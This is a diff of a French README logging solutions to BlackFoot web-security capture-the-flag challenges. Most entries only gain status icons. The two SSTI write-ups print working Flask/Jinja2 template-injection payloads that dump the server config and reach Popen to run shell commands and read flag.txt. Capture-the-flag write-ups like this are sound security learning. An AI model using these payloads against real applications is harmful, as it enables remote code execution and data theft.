@@ -4,12 +4,12 @@ Sujet du repo: [Resolutions des defis de securité web créé par BlackFoot](htt
 
 ## Open Field
 
-### Wordstress
+### :x: Wordstress
 
 
 ## Graphql
 
-### Confessions
+### :white_circle: Confessions
 
 Nom de la categorie: GraphQL -> inspection des requettes effectué.  
 Le schema graphql est public.  
@@ -26,79 +26,94 @@ On a essayé:
 
 ## SSTI
 
-### SSTI 1
+### :heavy_check_mark: SSTI 1
 
-### SSTI 2
+Le nom de la category est SSTI (Server Side Template Injection).  
+Le titre de la page est Flaaaasque, on peut donc conclure que le moteur utilisé est Flask.  
+Apres test, on peut utiliser `{{8*8}}` pour tester et faire un calcul.  
+En utilisant `{{config.items()}}` on peut obtenir la config du server.  
+cf [/SSTI/SSTI_1/config.dump.txt](/SSTI/SSTI_1/config.dump.txt) un dump de la config du server.  
+Flag trouvé: `('FLAG', 'BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}')`
 
-### SSTI 3
+### :heavy_check_mark: SSTI 2
 
-### SSTI 4
+Aussi du Flask, donc on peut utiliser `{{8*8}}`.  
+En utilisant `{{config.items()}}` on peut obtenir la config du server [cf config dump](/SSTI/SSTI_2/config.dump.txt) mais le flag ne s'y trouve pas.  
+En utilisant `{{''.__class__.__mro__ [1].__subclasses__()}}` on peut recuperer la liste de class disponnibles [cf class dump](/SSTI/SSTI_2/class.dump.txt).  
+Utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[268:]}}` permet de recuperer la class Popen.  
+Utiliser la Popen nou permet d'utiliser cette commande: `{{ ''.__class__.__mro__ [1].__subclasses__()[268]('ls', shell=True,stdout=-1).communicate()}}`, ce qui nou renvoi `(b'app.py\nconfig.py\nflag.txt\nindex.html\n', None)`.  
+On peut voir un fichier appelé flag.txt, pour l'afficher, on peut utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[268]('cat flag.txt', shell=True,stdout=-1).communicate()}}`, ce qui nous donne: `(b'BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}', None)`.  
+On a donc trouvé le flag `BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}`
+
+### :x: SSTI 3
+
+### :x: SSTI 4
 
 
 ## SSRF
 
-### SSRF 1
+### :x: SSRF 1
 
 
 ## Obfuscation
 
-### OBF 100
+### :x: OBF 100
 
-### SCRIPT_KIDDING
+### :x: SCRIPT_KIDDING
 
 
 ## XXE
 
-### XXE 1
+### :x: XXE 1
 
-### XXE 2
+### :x: XXE 2
 
 
 ## XSS
 
-### Whatsup
+### :x: Whatsup
 
-### Whatsup2
+### :x: Whatsup2
 
 
 ## JWT
 
-### Mythique 1
+### :x: Mythique 1
 
-### Mythique 2
+### :x: Mythique 2
 
-### Mythique 3
+### :x: Mythique 3
 
 
 ## SQLI
 
-### Potionseller
+### :x: Potionseller
 
-### Potionseller 2
+### :x: Potionseller 2
 
 
 ## IFI
 
-### noprotection
+### :x: noprotection
 
-### filters
+### :x: filters
 
-### extprotect
+### :x: extprotect
 
-### remote
+### :x: remote
 
 
 ## Auth
 
-### Auth 50
+### :x: Auth 50
 
-### Auth 100
+### :x: Auth 100
 
-### Auth 200
+### :x: Auth 200
 
 
 ## JS
 
-### b64js
+### :x: b64js
 
-### JS200
+### :x: JS200
